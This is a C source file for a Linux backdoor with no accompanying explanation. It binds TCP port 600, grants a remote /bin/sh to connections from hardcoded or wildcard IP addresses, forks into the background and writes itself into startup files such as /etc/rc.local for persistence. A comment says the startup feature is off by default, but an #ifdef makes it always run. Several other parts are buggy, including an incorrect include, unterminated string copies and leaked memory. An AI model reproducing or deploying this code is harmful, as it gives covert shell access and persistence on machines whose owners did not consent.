#include <unistd.h> 
#include <stdio.h>
#include <stdlib.h>
#include <socket.h>
#include <string.h>

#define MAXCON 2

#define PORT 600

#define STARTUP 0  //Set to false by default, feature is not reliably working on all linux distros, needs some more work.

u_char* AllowedIP[] = { "192.169.1.43", "182.68.177.123", (void*)0 };
char* DynamicIP[] = { "62.129.*", (void*)0 }; // "122.162.*",

int Authorize(u_char *ip)
{
    int i;
    for (i=0; AllowedIP[i] != NULL; i++)
    {
        if (!strcmp(ip, AllowedIP[i]))
        {
            return 1;
        }
    }
    for (i=0; DynamicIP[i] != NULL; i++)
    {
        int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i]);
        
        //STRIP * CHAR AWAY
        char* allowedStripped = (char*) malloc(x);
        strncpy(allowedStripped, DynamicIP[i], x);

        //MAKE SUBSTRING OF INCOMING IP
        char* incomingStripped = (char*) malloc(x + 1);
        strncpy(incomingStripped, ip, x);

        //printf("INCOMING: %s, ALLOWED: %s\n", incomingStripped, allowedStripped);
        
        if (!strncmp(incomingStripped, allowedStripped, x))
        {
            printf("\nAccess for %s granted!\n", ip);
            return 1;
        }
        else{
            printf("\nAccess for %s denied!\n", ip);
        }
    }
    return 0;
}

void doMyThing(u_int sd, u_char *src) 
{
    if (Authorize(src))
    {
        dup2(sd, 0); //in
        dup2(sd, 1); //out
        dup2(sd, 2); //err
        execl("/bin/sh", "/bin/sh", (char *)0);
        close(sd);
        exit(0);
    }
    else{

    }
}

int main(int argc, char *argv[]) 
{
#ifdef STARTUP
    int on,i;
    char cwd[256],*str;
    FILE *file;
    str="/etc/rc.d/rc.local";
    file=fopen(str,"r");
    if (file == NULL) 
    {
        str="/etc/rc.conf";
        file=fopen(str,"r");
    }
    if (file == NULL) 
    {
        str="/etc/rc.local";
        file=fopen(str,"r");
    }
    if (file != NULL) 
    {
            char outfile[256], buf[1024];
            int i=strlen(argv[0]), d=0;
            getcwd(cwd,256);
            if (strcmp(cwd,"/")) 
            {
                    while(argv[0][i] != '/') i--;

                    sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                    while(!feof(file)) 
                    {
                            fgets(buf,1024,file);
                            if (!strcasecmp(buf,outfile)) d++;
                    }
                    if (d == 0) 
                    {
                            FILE *out;
                            fclose(file);
                            out=fopen(str,"w+");
                            if (out != NULL) 
                            {
                                    fputs(outfile,out);
                                    fputs("\nexit 0\n",out);
                                    fclose(out);
                            }
                    }
                    else fclose(file);
            }
            else fclose(file);
    }
#endif

    struct sockaddr_in local;
    struct sockaddr_in remote;
    int sIN, sOUT;
    int len;

    memset((u_char *)&local, 0, sizeof(local));

    local.sin_family = AF_INET;
    local.sin_addr.s_addr = INADDR_ANY;
    local.sin_port = htons(PORT);

    if ((sIN = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
    	perror("socket() failed");
    	return 1;
    }

    if (bind(sIN, (struct sockaddr *)&local, sizeof(local)))
    {
        perror("bind() failed");
        return 1; 
    }

    if (listen(sIN, MAXCON))
    {
        perror("listen() failed");
        return 1;
    }

    if (fork()) exit(0);

    len = sizeof(local);

    while (1)
    {
        sOUT = accept(sIN, (struct sockaddr *)&remote, &len);
        if (fork() != 0)
        {
            close(sIN);
            //doMyThing(sOUT, inet_ntoa(remote.sin_addr));

            if (Authorize(inet_ntoa(remote.sin_addr)))
    		{
    			dup2(sOUT, 0); //in
        		dup2(sOUT, 1); //out
        		dup2(sOUT, 2); //err
        		execl("/bin/sh", "/bin/sh", (char *)0);
        		close(sOUT);
        		exit(0);
        	}
        	else{
        		exit(0);
        	}
        }
        close(sOUT);
    }
    close(sIN);
    return 0;
}

